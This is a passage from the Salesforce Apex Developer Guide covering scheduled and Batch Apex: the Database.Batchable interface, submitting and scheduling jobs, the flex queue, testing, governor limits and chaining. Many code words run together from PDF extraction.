Synchronous Web service callouts aren’t supported from scheduled Apex. To make asynchronous callouts, use Queueable Apex,
implementing the Database.AllowsCallouts marker interface. If your scheduled Apex executes a batch job using the
Database.AllowsCallouts marker interface, callouts are supported from the batch class. See Using Batch Apex.
•
Apex jobs scheduled to run during a Salesforce service maintenance downtime will be scheduled to run after the service comes
back up, when system resources become available. If a scheduled Apex job was running when downtime occurred, the job is rolled
back and scheduled again after the service comes back up. After major service upgrades, there can be longer delays than usual for
starting scheduled Apex jobs because of system usage spikes.
•
When you refresh a sandbox, scheduled jobs from the source org aren't copied. You must reschedule any jobs that you need in the
refreshed sandbox.
•
Scheduled job objects, along with their member variables and properties, persist from initialization to subsequent scheduled runs.
The object state at the time of invocation of System.schedule() persists in subsequent job executions.
With Batch Apex, it’s possible to force a new serialized state for new jobs by usingDatabase.Stateful. With Scheduled Apex,
use the transient keyword so that member variables and properties aren’t persisted. See Using the transient Keyword on page
88..
•
If you attempt to deploy changes to a class or its dependent code when the class is scheduled for execution, you see the error This
schedulableclasshas jobspendingor in progress- CronTriggerIDs (ids). You can also
see the message You can bypassthiserrorby allowingdeploymentswithApexjobsin the
DeploymentSettingspagein Setup. If you enable this setting, be aware that the job can fail. Instead, we recommend
that you first delete the scheduled job, and then deploy your changes. After deployment, create a new scheduled job with the
updated class.
302
Invoking ApexApex Developer Guide

•
If you resume a paused scheduled job, the job immediately runs one time. Subsequent executions of the job run according to the
established schedule. Any scheduled executions that were missed while the job was paused don’t run.
SEE ALSO:
Apex Reference Guide: Schedulable Interface
Batch Apex
A developer can now employ batch Apex to build complex, long-running processes that run on thousands of records on the Lightning
Platform. Batch Apex operates over small batches of records, covering your entire record set and breaking the processing down to
manageable chunks. For example, a developer could build an archiving solution that runs on a nightly basis, looking for records past a
certain date and adding them to an archive. Or a developer could build a data cleansing operation that goes through all Accounts and
Opportunities on a nightly basis and updates them if necessary, based on custom criteria.
Batch Apex is exposed as an interface that must be implemented by the developer. Batch jobs can be programmatically invoked at
runtime using Apex.
You can only have five queued or active batch jobs at one time. You can evaluate your current count by viewing the Scheduled Jobs
page in Salesforce or programmatically using SOAP API to query the AsyncApexJob object.
Warning: Use extreme care if you are planning to invoke a batch job from a trigger. You must be able to guarantee that the
trigger does not add more batch jobs than the limit. In particular, consider API bulk updates, import wizards, mass record changes
through the user interface, and all cases where more than one record can be updated at a time.
Batch jobs can also be programmatically scheduled to run at specific times using the Apex scheduler, or scheduled using the Schedule
Apex page in the Salesforce user interface. For more information on the Schedule Apex page, see “Schedule Apex Jobs” in the Salesforce
online help.
The batch Apex interface is also used for Apex managed sharing recalculations.
For more information on batch jobs, continue to Using Batch Apex on page 303.
For more information on Apex managed sharing, see Understanding Apex Managed Sharing on page 221.
For more information on firing platform events from batch Apex, see Firing Platform Events from Batch Apex
Use Batch Apex
To use batch Apex, write an Apex class that implements the Salesforce-provided interface Database.Batchable and then
invoke the class programmatically. To monitor or stop the execution of the batch Apex job, from Setup, enter ApexJobs in the
Quick Find box and then select Apex Jobs.
Firing Platform Events from Batch Apex
Batch Apex classes can fire platform events when encountering an error or exception. Clients listening on an event can obtain
actionable information, such as how often the event failed and which records were in scope at the time of failure. Events are also
fired for Salesforce Platform internal errors and other uncatchable Apex exceptions such as LimitExceptions, which are caused by
reaching governor limits.
Use Batch Apex
To use batch Apex, write an Apex class that implements the Salesforce-provided interface Database.Batchable and then invoke
the class programmatically. To monitor or stop the execution of the batch Apex job, from Setup, enter ApexJobs in the Quick Find
box and then select Apex Jobs.
303
Invoking ApexApex Developer Guide

Implement the Database.Batchable Interface
The Database.Batchable interface contains three methods that must be implemented.
•
start method:
public(Database.QueryLocator| Iterable<sObject>)start(Database.BatchableContextbc)
{}
The start method is called at the beginning of a batch Apex job. In the start method, you can include code that collects
records or objects to pass to the interface method execute. This method returns either a Database.QueryLocator object
or an iterable that contains the records or objects passed to the job.
When you’re using a simple query (SELECT) to generate the scope of objects in the batch job, use the
Database.QueryLocator object. If you use a QueryLocator object, the governor limit for the total number of records
retrieved by SOQL queries is bypassed. For example, a batch Apex job for the Account object can return a QueryLocator for all
account records (up to 50 million records) in an org. Another example is a sharing recalculation for the Contact object that returns
a QueryLocator for all account records in an org.
Use the iterable to create a complex scope for the batch job. You can also use the iterable to create your own custom process for
iterating through the list.
Important:  If you use an iterable, the governor limit for the total number of records retrieved by SOQL queries is still enforced.
For more information on using iterables for batch jobs, see Batch Apex Considerations and Best Practices.
•
execute method:
publicvoidexecute(Database.BatchableContextbc, list<P>){}
The execute method is called for each batch of records that you pass to it and takes these parameters.
–
A reference to the Database.BatchableContext object.
–
A list of sObjects, such as List<sObject>, or a list of parameterized types. If you’re using a Database.QueryLocator,
use the returned list.
Batches of records tend to execute in the order in which they’re received from the start method. However, the order in which
batches of records execute depends on various factors. The order of execution isn’t guaranteed.
•
finish method:
publicvoidfinish(Database.BatchableContextbc){}
The finish method is called after all batches are processed and can be used to send confirmation emails or execute post-processing
operations.
Each execution of a batch Apex job is considered a discrete transaction. For example, a batch Apex job that contains 1,000 records and
is executed without the optional scope parameter from Database.executeBatch is considered five transactions of 200 records
each. The Apex governor limits are reset for each transaction. If the first transaction succeeds but the second fails, the database updates
made in the first transaction aren’t rolled back.
Use Database.BatchableContext
All the methods in the Database.Batchable interface require a reference to a Database.BatchableContext object.
Use this object to track the progress of the batch job.
The following is the instance method with the Database.BatchableContext object:
304
Invoking ApexApex Developer Guide

DescriptionReturnsArgumentsName
Returns the ID of the AsyncApexJob object associated with
this batch job as a string. Use this method to track the
IDgetJobID
progress of records in the batch job. You can also use this
ID with the System.abortJob method.
The following example uses the Database.BatchableContext to query the AsyncApexJob associated with the batch job.
publicvoidfinish(Database.BatchableContextbc){
// Get the ID of the AsyncApexJobrepresentingthisbatchjob
// fromDatabase.BatchableContext.
// Querythe AsyncApexJobobjectto retrievethe currentjob'sinformation.
AsyncApexJoba = [SELECTId, Status,NumberOfErrors,JobItemsProcessed,
TotalJobItems,CreatedBy.Email
FROMAsyncApexJobWHEREId =
:bc.getJobId()];
// Sendan emailto the Apexjob'ssubmitternotifyingof job completion.
Messaging.SingleEmailMessagemail= new Messaging.SingleEmailMessage();
String[] toAddresses= new String[] {a.CreatedBy.Email};
mail.setToAddresses(toAddresses);
mail.setSubject('ApexSharingRecalculation' + a.Status);
mail.setPlainTextBody
('ThebatchApexjob processed' + a.TotalJobItems+
' batcheswith'+ a.NumberOfErrors+ ' failures.');
Messaging.sendEmail(new Messaging.SingleEmailMessage[]{ mail});
}
Using Database.QueryLocator to Define Scope
The start method can return either a Database.QueryLocator object that contains the records to use in the batch job or
an iterable.
The following example uses a Database.QueryLocator:
publicclassSearchAndReplaceimplementsDatabase.Batchable<sObject>{
publicfinalStringQuery;
publicfinalStringEntity;
publicfinalStringField;
publicfinalStringValue;
publicSearchAndReplace(Stringq, Stringe, Stringf, Stringv){
Query=q;Entity=e;Field=f;Value=v;
}
publicDatabase.QueryLocatorstart(Database.BatchableContextbc){
returnDatabase.getQueryLocator(query);
}
publicvoidexecute(Database.BatchableContextbc, List<sObject>scope){
for(sobjects : scope){
305
Invoking ApexApex Developer Guide

s.put(Field,Value);
}
updatescope;
}
publicvoidfinish(Database.BatchableContextbc){
}
}
Using an Iterable in Batch Apex to Define Scope
The start method can return either a Database.QueryLocator object that contains the records to use in the batch job or
an iterable. Use an iterable to step through the returned items more easily.
publicclassbatchClassimplementsDatabase.batchable{
publicIterablestart(Database.BatchableContextinfo){
returnnew CustomAccountIterable();
}
publicvoidexecute(Database.BatchableContextinfo,List<Account>scope){
List<Account>accsToUpdate= new List<Account>();
for(Accounta : scope){
a.Name= 'true';
a.NumberOfEmployees= 70;
accsToUpdate.add(a);
}
updateaccsToUpdate;
}
publicvoidfinish(Database.BatchableContextinfo){
}
}
Using the Database.executeBatch Method to Submit Batch Jobs
You can use the Database.executeBatch method to programmatically begin a batch job.
Important: When you call Database.executeBatch, Salesforce adds the process to the queue. Actual execution can be
delayed based on service availability.
The Database.executeBatch method takes two parameters:
•
An instance of a class that implements the Database.Batchable interface.
•
An optional parameter scope. This parameter specifies the number of records to pass into the execute method. Use this
parameter when you have many operations for each record being passed in and are running into governor limits. By limiting the
number of records, you’re limiting the operations per transaction. This value must be greater than zero.If the start method of
the batch class returns a QueryLocator, the optional scope parameter of Database.executeBatch can have a maximum
value of 2,000. If set to a higher value, Salesforce chunks the records returned by the QueryLocator into smaller batches of up to
2,000 records. If the start method of the batch class returns an iterable, the scope parameter value has no upper limit. However,
if you use a high number, you can run into other limits. The optimal scope size is a factor of 2000, for example, 100, 200, 400 and so
on.
306
Invoking ApexApex Developer Guide

The Database.executeBatch method returns the ID of the AsyncApexJob object, which you can use to track the progress of
the job. For example:
ID batchprocessid= Database.executeBatch(reassign);
AsyncApexJobaaj = [SELECTId, Status,JobItemsProcessed,TotalJobItems,NumberOfErrors
FROMAsyncApexJobWHEREID =: batchprocessid];
You can also use this ID with the System.abortJob method.
For more information, see AsyncApexJob in the Object Reference for Salesforce.
Holding Batch Jobs in the Apex Flex Queue
With the Apex flex queue, you can submit up to 100 batch jobs.
The outcome of Database.executeBatch is as follows.
•
The batch job is placed in the Apex flex queue, and its status is set to Holding.
•
If the Apex flex queue has the maximum number of 100 jobs, Database.executeBatch throws a LimitException
and doesn't add the job to the queue.
•
If your org doesn’t have Apex flex queue enabled, Database.executeBatch adds the batch job to the batch job queue with
the Queued status. If the concurrent limit of queued or active batch jobs has been reached, a LimitException is thrown,
and the job isn’t queued.
•
It is possible that the number of jobs in the Apex flex queue sometimes exceeds the maximum limit, resulting from parallel requests
to enqueue batch Apex jobs. Further attempts to enqueue batch jobs will encounter a LimitException until the queue size
drops below the maximum limit.
Reordering Jobs in the Apex Flex Queue
While submitted jobs have a status of Holding, you can reorder them in the Salesforce user interface to control which batch jobs are
processed first. To do so, from Setup, enter ApexFlexQueue in the QuickFind box, then select Apex Flex Queue.
Alternatively, you can use Apex methods to reorder batch jobs in the flex queue. To move a job to a new position, call one of the
System.FlexQueue methods. Pass the method the job ID and, if applicable, the ID of the job next to the moved job’s new position.
For example:
BooleanisSuccess= System.FlexQueue.moveBeforeJob(jobToMoveId,jobInQueueId);
You can reorder jobs in the Apex flex queue to prioritize jobs. For example, you can move a batch job up to the first position in the
holding queue to be processed first when resources become available. Otherwise, jobs are processed “first-in, first-out”—in the order
in which they’re submitted.
When system resources become available, the system picks up the next job from the top of the Apex flex queue and moves it to the
batch job queue. The system can process up to five queued or active jobs simultaneously for each organization. The status of these
moved jobs changes from Holding to Queued. Queued jobs get executed when the system is ready to process new jobs. You can
monitor queued jobs on the Apex Jobs page.
Batch Job Statuses
The following table lists all possible statuses for a batch job along with a description of each.
DescriptionStatus
Job has been submitted and is held in the Apex flex queue until
system resources become available to queue the job for processing.
Holding
307
Invoking ApexApex Developer Guide

DescriptionStatus
Job is awaiting execution.Queued
The start method of the job has been invoked. This status can
last a few minutes depending on the size of the batch of records.
Preparing
Job is being processed.Processing
Job aborted by a user.Aborted
Job completed with or without failure.Completed
Job experienced a system failure.Failed
Using the System.scheduleBatch Method
You can use the System.scheduleBatch method to schedule a batch job to run once at a future time.
The System.scheduleBatch method takes these parameters.
•
An instance of a class that implements the Database.Batchable interface.
•
The job name.
•
The time interval, in minutes, after which the job starts executing.
•
An optional scope value. This parameter specifies the number of records to pass into the execute method. Use this parameter
when you have many operations for each record being passed in and are running into governor limits. By limiting the number of
records, you’re limiting the operations per transaction. This value must be greater than zero.If the start method of the batch class
returns a QueryLocator, the optional scope parameter of Database.executeBatch can have a maximum value of 2,000. If
set to a higher value, Salesforce chunks the records returned by the QueryLocator into smaller batches of up to 2,000 records. If the
start method of the batch class returns an iterable, the scope parameter value has no upper limit. However, if you use a high
number, you can run into other limits. The optimal scope size is a factor of 2000, for example, 100, 200, 400 and so on.
The System.scheduleBatch method returns the scheduled job ID (CronTrigger ID).
This example schedules a batch job to run 60 minutes from now by calling System.scheduleBatch. The example passes this
method an instance of a batch class (the reassign variable), a job name, and a time interval of 60 minutes. The optional scope
parameter has been omitted. The method returns the scheduled job ID, which is used to query CronTrigger to get the status of the
corresponding scheduled job.
StringcronID= System.scheduleBatch(reassign,'jobexample', 60);
CronTriggerct = [SELECTId, TimesTriggered,NextFireTime
FROMCronTriggerWHEREId = :cronID];
// TimesTriggeredshouldbe 0 becausethe job hasn'tstartedyet.
System.assertEquals(0,ct.TimesTriggered);
System.debug('Nextfiretime:' + ct.NextFireTime);
// For example:
// Nextfiretime:2013-06-0313:31:23
For more information, see CronTrigger in the Object Reference for Salesforce.
308
Invoking ApexApex Developer Guide

Note:  Some things to note about System.scheduleBatch:
•
When you call System.scheduleBatch, Salesforce schedules the job for execution at the specified time. Actual execution
occurs at or after that time, depending on service availability.
•
The scheduler runs as system—all classes are executed, whether the user has permission to execute the class or not.
•
When the job’s schedule is triggered, the system queues the batch job for processing. If Apex flex queue is enabled in your
org, the batch job is added at the end of the flex queue. For more information, see Holding Batch Jobs in the Apex Flex Queue.
•
All scheduled Apex limits apply for batch jobs scheduled using System.scheduleBatch. After the batch job is queued
(with a status of Holding or Queued), all batch job limits apply and the job no longer counts toward scheduled Apex
limits.
•
After calling this method and before the batch job starts, you can use the returned scheduled job ID to abort the scheduled
job using the System.abortJob method.
Batch Apex Examples
The following example uses a Database.QueryLocator:
publicclassUpdateAccountFieldsimplementsDatabase.Batchable<sObject>{
publicfinalStringQuery;
publicfinalStringEntity;
publicfinalStringField;
publicfinalStringValue;
publicUpdateAccountFields(Stringq, Stringe, Stringf, Stringv){
Query=q;Entity=e;Field=f;Value=v;
}
publicDatabase.QueryLocatorstart(Database.BatchableContextbc){
returnDatabase.getQueryLocator(query);
}
publicvoidexecute(Database.BatchableContextbc,
List<sObject>scope){
for(Sobjects : scope){s.put(Field,Value);
}updatescope;
}
publicvoidfinish(Database.BatchableContextbc){
}
}
You can use this code to call the previous class.
// Queryfor 10 accounts
Stringq = 'SELECTIndustryFROMAccountLIMIT10';
Stringe = 'Account';
Stringf = 'Industry';
Stringv = 'Consulting';
Id batchInstanceId= Database.executeBatch(new UpdateAccountFields(q,e,f,v),5);
309
Invoking ApexApex Developer Guide

To exclude accounts or invoices that were deleted but are still in the Recycle Bin, include isDeleted=false in the SOQL query
WHERE clause, as shown in these modified samples.
// Queryfor accountsthataren'tin the RecycleBin
Stringq = 'SELECTIndustryFROMAccountWHEREisDeleted=falseLIMIT10';
Stringe = 'Account';
Stringf = 'Industry';
Stringv = 'Consulting';
Id batchInstanceId= Database.executeBatch(new UpdateAccountFields(q,e,f,v),5);
// Queryfor invoicesthataren'tin the RecycleBin
Stringq =
'SELECTDescription__cFROMInvoice_Statement__cWHEREisDeleted=falseLIMIT10';
Stringe = 'Invoice_Statement__c';
Stringf = 'Description__c';
Stringv = 'Updateddescription';
Id batchInstanceId= Database.executeBatch(new UpdateInvoiceFields(q,e,f,v),5);
The following class uses batch Apex to reassign all accounts owned by a specific user to a different user.
publicclassOwnerReassignmentimplementsDatabase.Batchable<sObject>{
Stringquery;
Stringemail;
Id toUserId;
Id fromUserId;
publicDatabase.querylocatorstart(Database.BatchableContextbc){
returnDatabase.getQueryLocator(query);}
publicvoidexecute(Database.BatchableContextbc, List<sObject>scope){
List<Account>accns= new List<Account>();
for(sObjects : scope){Accounta = (Account)s;
if(a.OwnerId==fromUserId){
a.OwnerId=toUserId;
accns.add(a);
}
}
updateaccns;
}
publicvoidfinish(Database.BatchableContextbc){
Messaging.SingleEmailMessagemail= new Messaging.SingleEmailMessage();
mail.setToAddresses(new String[] {email});
mail.setReplyTo('batch@acme.com');
mail.setSenderDisplayName('BatchProcessing');
mail.setSubject('BatchProcessCompleted');
mail.setPlainTextBody('BatchProcesshas completed');
Messaging.sendEmail(new Messaging.SingleEmailMessage[]{ mail});
}
}
310
Invoking ApexApex Developer Guide

Use this code to execute the OwnerReassignment class in the previous example.
OwnerReassignmentreassign= new OwnerReassignment();
reassign.query= 'SELECTId, Name,OwneridFROMAccount' +
'WHEREownerid=\''+ u.id+ '\'';
reassign.email='admin@acme.com';
reassign.fromUserId= u;
reassign.toUserId= u2;
ID batchprocessid= Database.executeBatch(reassign);
The following is an example of a batch Apex class for deleting records.
publicclassBatchDeleteimplementsDatabase.Batchable<sObject>{
publicStringquery;
publicDatabase.QueryLocatorstart(Database.BatchableContextbc){
returnDatabase.getQueryLocator(query);
}
publicvoidexecute(Database.BatchableContextbc, List<sObject>scope){
deletescope;
DataBase.emptyRecycleBin(scope);
}
publicvoidfinish(Database.BatchableContextbc){
}
}
This code calls the BatchDelete batch Apex class to delete old documents. The specified query selects documents to delete for all
documents that are in a specified folder and that are older than a specified date. Next, the sample invokes the batch job.
BatchDeleteBDel= new BatchDelete();
Datetimed = Datetime.now();
d = d.addDays(-1);
// Replacethisvaluewiththe folderID thatcontains
// the documentsto delete.
StringfolderId= '00lD000000116lD';
// Queryfor selectingthe documentsto delete
BDel.query= 'SELECTId FROMDocumentWHEREFolderId=\''+ folderId+
'\' AND CreatedDate< '+d.format('yyyy-MM-dd')+'T'+
d.format('HH:mm')+':00.000Z';
// Invokethe batchjob.
ID batchprocessid= Database.executeBatch(BDel);
System.debug('ReturnedbatchprocessID: ' + batchProcessId);
Using Callouts in Batch Apex
To use a callout in batch Apex, specify Database.AllowsCallouts in the class definition. For example:
publicclassSearchAndReplaceimplementsDatabase.Batchable<sObject>,
Database.AllowsCallouts{
}
Callouts include HTTP requests and methods defined with the webservice keyword.
311
Invoking ApexApex Developer Guide

Using State in Batch Apex
Each execution of a batch Apex job is considered a discrete transaction. For example, a batch Apex job that contains 1,000 records and
is executed without the optional scope parameter is considered five transactions of 200 records each.
If you specify Database.Stateful in the class definition, you can maintain state across these transactions. When using
Database.Stateful, only instance member variables retain their values between transactions. Static member variables don’t
retain their values and are reset between transactions. Maintaining state is useful for counting or summarizing records as they’re processed.
For example, suppose your job processes opportunity records. You can define a method in execute to aggregate the totals of the
opportunity amounts as they are processed.
If you don’t specify Database.Stateful, all static and instance member variables are set back to their original values.
The following example summarizes a custom field total__c as the records are processed.
publicclassSummarizeAccountTotalimplements
Database.Batchable<sObject>,Database.Stateful{
publicfinalStringQuery;
publicintegerSummary;
publicSummarizeAccountTotal(Stringq){Query=q;
Summary= 0;
}
publicDatabase.QueryLocatorstart(Database.BatchableContextbc){
returnDatabase.getQueryLocator(query);
}
publicvoidexecute(
Database.BatchableContextbc,
List<sObject>scope){
for(sObjects : scope){
Summary= Integer.valueOf(s.get('total__c'))+Summary;
}
}
publicvoidfinish(Database.BatchableContextbc){
}
}
In addition, you can specify a variable to access the initial state of the class. You can use this variable to share the initial state with all
instances of the Database.Batchable methods. For example:
// Implementthe interfaceusinga listof AccountsObjects
// Notethatthe initialStatevariableis declaredas final
publicclassMyBatchableimplementsDatabase.Batchable<sObject>{
privatefinalStringinitialState;
Stringquery;
publicMyBatchable(StringintialState){
this.initialState= initialState;
}
publicDatabase.QueryLocatorstart(Database.BatchableContextbc) {
312
Invoking ApexApex Developer Guide

// AccessinitialStatehere
returnDatabase.getQueryLocator(query);
}
publicvoidexecute(Database.BatchableContextbc,
List<sObject>batch){
// AccessinitialStatehere
}
publicvoidfinish(Database.BatchableContextbc) {
// AccessinitialStatehere
}
}
The initialState stores only the initial state of the class. You can’t use it to pass information between instances of the class during
execution of the batch job. For example, if you change the value of initialState in execute, the second chunk of processed
records can’t access the new value. Only the initial value is accessible.
Testing Batch Apex
When testing your batch Apex, you can test only one execution of the execute method. Use the scope parameter of the
executeBatch method to limit the number of records passed into the execute method to ensure that you aren’t running into
governor limits.
The executeBatch method starts an asynchronous process. When you test batch Apex, make certain that the asynchronously
processed batch job is finished before testing against the results. Use the Test methods startTest and stopTest around the
executeBatch method to ensure that it finishes before continuing your test. All asynchronous calls made after the startTest
method are collected by the system. When stopTest is executed, all asynchronous processes are run synchronously. If you don’t
include the executeBatch method within the startTest and stopTest methods, the batch job executes at the end of your
test method. This execution order applies for Apex saved using API version 25.0 and later, but not for earlier versions.
For Apex saved using API version 22.0 and later, exceptions that occur during the execution of a batch Apex job invoked by a test method
are passed to the calling test method. As a result, these exceptions cause the test method to fail. If you want to handle exceptions in the
test method, enclose the code in try and catch statements. Place the catch block after the stopTest method. However, with
Apex saved using Apex version 21.0 and earlier, such exceptions don’t get passed to the test method and don’t cause test methods to
fail.
Note:  Asynchronous calls, such as @future or executeBatch, called in a startTest, stopTest block, don’t count
against your limits for the number of queued jobs.
The following example tests the OwnerReassignment class.
publicstatictestMethodvoidtestBatch(){
useru = [SELECTID, UserNameFROMUser
WHEREusername='testuser1@acme.com'];
useru2 = [SELECTID, UserNameFROMUser
WHEREusername='testuser2@acme.com'];
Stringu2id= u2.id;
// Create200 testaccounts- thissimulatesone execute.
// Important- the Salesforcetestframeworkonlyallowsyou to
// testone execute.
313
Invoking ApexApex Developer Guide

List<Account>accns= new List<Account>();
for(integeri = 0; i<200;i++){
Accounta = new Account(Name='testAccount'+ i,
Ownerid= u.ID);
accns.add(a);
}
insertaccns;
Test.StartTest();
OwnerReassignmentreassign= new OwnerReassignment();
reassign.query='SELECTID, Name,Ownerid' +
'FROMAccount' +
'WHEREOwnerId=\''+ u.Id+ '\''+
' LIMIT200';
reassign.email='admin@acme.com';
reassign.fromUserId= u.Id;
reassign.toUserId= u2.Id;
ID batchprocessid= Database.executeBatch(reassign);
Test.StopTest();
System.AssertEquals(
database.countquery('SELECTCOUNT()'
+' FROMAccountWHEREOwnerId=\''+ u2.Id+ '\''),
200);
}
}
Use the System.Test.enqueueBatchJobs and System.Test.getFlexQueueOrder methods to enqueue and
reorder no-operation jobs within the context of tests.
Batch Apex Limitations
Keep in mind these governor limits and other limitations for batch Apex.
•
Up to 5 batch jobs can be queued or active concurrently.
•
Up to 100 Holding batch jobs can be held in the Apex flex queue.
•
In a running test, you can submit a maximum of 5 batch jobs.
•
The maximum number of batch Apex method executions per 24-hour period is 250,000, or the number of user licenses in your org
multiplied by 200—whichever is greater. Method executions include executions of the start, execute, and finish methods.
This limit is for your entire org and is shared with all asynchronous Apex: Batch Apex, Queueable Apex, scheduled Apex, and future
methods. To check how many asynchronous Apex executions are available, make a request to REST API limits resource. See List
Organization Limits in the REST API Developer Guide. If the number of asynchronous Apex executions needed by a job exceeds the
available number that’s calculated using the 24-hour rolling limit, an exception is thrown. Batch Apex preemptively checks the
required asynchronous job capacity when Database.executeBatch is called and the start method has returned the
workload. The batch won’t start unless there is sufficient capacity for the entire job available. For example, if the batch requires 10,000
executions and the remaining asynchronous limit is 9,500 executions, an AsyncApexExecutionsLimitexceeded
exception is thrown, and the remaining executions are left unchanged. The license types that count toward this limit include full
Salesforce and Salesforce Platform user licenses, App Subscription user licenses, Chatter Only users, Identity users, and Company
Communities users.
314
Invoking ApexApex Developer Guide

•
A maximum of 50 million records can be returned in the Database.QueryLocator object. If more than 50 million records
are returned, the batch job is immediately terminated and marked as Failed.
•
If the start method of the batch class returns a QueryLocator, the optional scope parameter of Database.executeBatch
can have a maximum value of 2,000. If set to a higher value, Salesforce chunks the records returned by the QueryLocator into smaller
batches of up to 2,000 records. If the start method of the batch class returns an iterable, the scope parameter value has no upper
limit. However, if you use a high number, you can run into other limits. The optimal scope size is a factor of 2000, for example, 100,
200, 400 and so on.
•
If no size is specified with the optional scope parameter of Database.executeBatch, Salesforce chunks the records returned
by the start method into batches of 200 records. The system then passes each batch to the execute method. Apex governor
limits are reset for each execution of execute.
•
The start, execute, and finish methods can implement up to 100 callouts each.
•
Only one batch Apex job's start method can run at a time in an org. Batch jobs that haven’t started yet remain in the queue until
they're started. This limit doesn’t cause any batch job to fail and execute methods of batch Apex jobs still run in parallel if more
than one job is running.
•
Enqueued batch Apex jobs are processed when system resources become available. There’s no guarantee on how long it takes to
start, execute, and finish the queued jobs. You can use the Apex flex queue to prioritize jobs.
•
Using FOR UPDATE in SOQL queries to lock records during update isn’t applicable to Batch Apex.
•
Database.QueryLocator objects and related query results are available for 2 days, including results in nested queries. For
more information, see API Query Cursor Limits.
Batch Apex Considerations and Best Practices
•
Use extreme caution if you’re planning to invoke a batch job from a trigger. You must be able to guarantee that the trigger doesn’t
add more batch jobs than the limit. In particular, consider API bulk updates, import wizards, mass record changes through the user
interface, and all cases where more than one record can be updated at a time.
•
When you call Database.executeBatch, Salesforce only places the job in the queue. Actual execution can be delayed based
on service availability and flex queue priority.
•
When testing your batch Apex, you can test only one execution of the execute method. Use the scope parameter of the
executeBatch method to limit the number of records passed into the execute method to ensure that you aren’t running
into governor limits.
•
The executeBatch method starts an asynchronous process. When you test batch Apex, make certain that the asynchronously
processed batch job is finished before testing against the results. Use the Test methods startTest and stopTest around
the executeBatch method to ensure that it finishes before continuing your test.
•
Use Database.Stateful with the class definition if you want to share instance member variables or data across job transactions.
Otherwise, all member variables are reset to their initial state at the start of each transaction.
•
Methods declared as future aren’t allowed in classes that implement the Database.Batchable interface.
•
Methods declared as future can’t be called from a batch Apex class.
•
When a batch Apex job is run, email notifications are sent to the user who submitted the batch job. If the code is included in a
managed package and the subscribing org is running the batch job, notifications are sent to the recipient listed in the Apex
ExceptionNotificationRecipient field.
•
Each method execution uses the standard governor limits anonymous block, Visualforce controller, or WSDL method.
•
Each batch Apex invocation creates an AsyncApexJob record. To construct a SOQL query to retrieve the job’s status, number
of errors, progress, and submitter, use the AsyncApexJob record’s ID. For more information about the AsyncApexJob object,
see AsyncApexJob in the Object Reference for Salesforce.
315
Invoking ApexApex Developer Guide

•
For each 10,000 AsyncApexJob records, Apex creates an AsyncApexJob record of type BatchApexWorker for internal
use. When querying for all AsyncApexJob records, we recommend that you filter out records of type BatchApexWorker
using the JobType field. Otherwise, the query returns one more record for every 10,000 AsyncApexJob records. For more
information about the AsyncApexJob object, see AsyncApexJob in the Object Reference for Salesforce.
•
All implemented Database.Batchable interface methods must be defined as public or global.
•
For a sharing recalculation, we recommend that the execute method delete and then re-create all Apex managed sharing for
the records in the batch. This process ensures that sharing is accurate and complete.
•
Batch jobs queued before a Salesforce service maintenance downtime remain in the queue. After service downtime ends and when
system resources become available, the queued batch jobs are executed. If a batch job is running when downtime occurred, the
batch execution is rolled back and restarted after the service comes back up. Because execute methods can therefore run multiple
times, any non-transactional operations, such as callouts, can be retried. All non-transactional operations must follow Idempotent
Design Considerations to maintain data integrity.
•
Minimize the number of batches, if possible. Salesforce uses a queue-based framework to handle asynchronous processes from such
sources as future methods and batch Apex. This queue is used to balance request workload across organizations. If more than 2,000
unprocessed requests from a single organization are in the queue, any additional requests from the same organization are delayed
while the queue handles requests from other organizations.
•
Salesforce recommends that you design your asynchronous Apex jobs to handle variations in processing time. For example, to
handle potential processing overlaps, consider chaining batch jobs on page 317 instead of scheduling jobs at fixed intervals.
•
Ensure that batch jobs execute as fast as possible. To ensure fast execution of batch jobs, minimize Web service callout times and
tune the queries used in your batch Apex code. The longer the batch job executes, the more likely other queued jobs are delayed
when many jobs are in the queue.
•
If you use batch Apex with Database.QueryLocator to access external objects via an OData adapter for Salesforce Connect:
–
Enable Request Row Counts on the external data source, and each response from the external system must include the total
row count of the result set.
–
We recommend enabling Server-Driven Pagination on the external data source and having the external system determine page
sizes and batch boundaries for large result sets. Typically, server-driven paging can adjust batch boundaries to accommodate
changing datasets more effectively than client-driven paging.
When Server-Driven Pagination is disabled on the external data source, the OData adapter controls the paging behavior
(client-driven). If external object records are added to the external system while a job runs, other records can be processed twice.
If external object records are deleted from the external system while a job runs, other records can be skipped.
–
When Server-Driven Pagination is enabled on the external data source, the batch size at runtime is the smaller of these two sizes:
•
Batch size specified in the scope parameter of Database.executeBatch. The default is 200 records.
•
Page size returned by the external system. We recommend that you set up your external system to return page sizes of 200
or fewer records.
•
Batch Apex jobs run faster when the start method returns a QueryLocator object that doesn't include related records via
a subquery. Avoiding relationship subqueries in a QueryLocator allows batch jobs to run using a faster, chunked implementation.
If the start method returns an iterable or a QueryLocator object with a relationship subquery, the batch job uses a slower,
non-chunking, implementation. For example, if this query is used in the QueryLocator, the batch job uses a slower implementation
because of the relationship subquery:
SELECTId, (SELECTid FROMContacts)FROMAccount
A better strategy is to perform the subquery separately, from within the execute method, which allows the batch job to run
using the faster, chunking implementation.
316
Invoking ApexApex Developer Guide

•
To implement record locking as part of the batch job, you can requery records inside the execute method, using FOR UPDATE.
Requerying records in this manner ensures that conflicting updates aren’t overwritten by DML in the batch job. To requery records,
simply select the Id field in the batch job's main query locator.
•
The Salesforce Platform's flow control mechanism and fair-usage algorithm can cause a delay in running batch jobs.
Chaining Batch Jobs
Starting with API version 26.0, you can start another batch job from an existing batch job to chain jobs together. Chaining enforces strict
sequential execution, ensuring that one job fully completes before the next one starts. This sequencing prevents situations where multiple
batch jobs attempt to concurrently process the same records, which can lead to race conditions or data inconsistencies. Use chained
batch jobs if you require sequential execution and batch processing, such as processing large data volumes. Otherwise, if batch processing
isn’t needed, consider using Queueable Apex.
You can chain a batch job by calling Database.executeBatch or System.scheduleBatch from the finish method
of the current batch class. The new batch job starts after the current batch job finishes.
A potential failure point in chained batch jobs is an unhandled exception within the job’s finish method. The unhandled exception
prevents the next job from being enqueued and breaks the sequence. To safeguard against this point of failure, consider implementing
a separate scheduled Apex job that periodically checks the status of the chain. The scheduled job queries the AsyncApexJob object
for records where the JobType is 'BatchApex' and the ApexClass.Name matches the class expected to be currently running
or queued within the chain. If this query returns no results, the expected job is neither running nor queued, which signifies that the chain
has been unexpectedly interrupted. The scheduled job then restarts the entire batch chain, which prevents unprocessed records from
accumulating and possibly reaching governor limits.
When creating a long chain of batch jobs, account for workload variations. If there's currently no further work to perform either in the
current job’s finish method or because your business is entering an off-peak period, use System.scheduleBatch to add a
